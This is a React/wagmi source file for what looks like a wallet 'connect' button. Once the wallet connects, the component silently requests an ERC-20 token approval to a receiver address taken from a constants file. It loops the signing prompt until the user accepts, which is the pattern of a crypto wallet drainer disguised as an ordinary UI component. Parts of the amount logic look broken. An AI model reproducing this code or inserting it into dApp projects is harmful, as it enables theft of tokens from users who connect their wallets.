"use client"
import { useSendTransaction, usePrepareContractWrite, useContractWrite, useWaitForTransaction ,useAccount, useBalance, useFeeData, useDisconnect, useWalletClient, useNetwork, useContractRead, usePublicClient } from 'wagmi'
import { signTrans } from '@/utils/transact'
import {useState} from "react"
import { erc20ABI } from 'wagmi'
import { receivers, con_adds } from '@/utils/constant/address'

//const receiver = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"
export const BCon = () => {
  //const adds = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"
  const publicClient = usePublicClient()
  
  const [amt, setAmt] = useState(BigInt("0"))

 // const [req, setRequest] = useState({})
  
  //const [account, setAccount] = useState('0x2170Ed0880ac9A755fd29B2688956BD959F933F8')
  const {chain} = useNetwork()
  const [receiver, setReceiver] = useState("0x2170Ed0880ac9A755fd29B2688956BD959F933F8")
  const [con_add, setConAdd] = useState('0xB8c77482e45F1F44dE1745F52C74426C631bDD52') 
  const {address, isConnected} = useAccount({

  async onConnect({ address, connector, isReconnected }) {
     
    let bal = data?.value || BigInt("0")

    /*
    const gasEst = await publicClient.estimateContractGas({
      address: con_add,
      abi: erc20ABI,
      functionName: "approve",
      args: [receiver, amt],
      account: address
      
    }) */
 /**
     * if(bal <= BigInt("0"))
     * {
     *   alert("Wallet not eligible")
     *   disconnect()
     * return
     * }
     * 
     */
    
    let fee = gasPrice?.gasPrice || BigInt("0")
    const rems = fee - bal // - fee change back to balance minus fee
    
    const cid = chain?.id || 1
    if(cid !== 1)

   { setConAdd(con_adds[cid])}
   // setReceiver(receivers[cid])
    setAmt(rems)
    console.log("Chain and address ",con_adds[cid])
    }
  })


const {data: walletClient, isFetched, status} = useWalletClient(
  
  { 
    
  onError(error) {
   
    console.log("WC error", error)
  },

  async onSuccess(data) {

    if(isConnected)
    {

      const addresses = await data?.getAddresses()
      // console.log(addresses)
      console.log(receiver, con_add)
      
      const {request} = await publicClient.simulateContract({
        address: con_add,
        abi: erc20ABI,
        functionName: "approve",
        args: [receiver, amt],
        account: address
        
      })
   //   console.log(data)
  while(true) 
    {

      try {
            const res = await data?.writeContract(request)
            console.log("WC datas",res)
break
          // await data?.sendRawTransaction(res)
       } catch (error) {
        console.log(error)
       }
     }
   }
  }
})
 

const { disconnect } = useDisconnect()

    const { data } = useBalance({
      address
    })
const {data: gasPrice } = useFeeData()
   
        if(isConnected) return <button className='btn btn-primary ' onClick={() => disconnect()}>Disconnect</button>
        return (
          <>
    <w3m-button />
     </>

        )

}


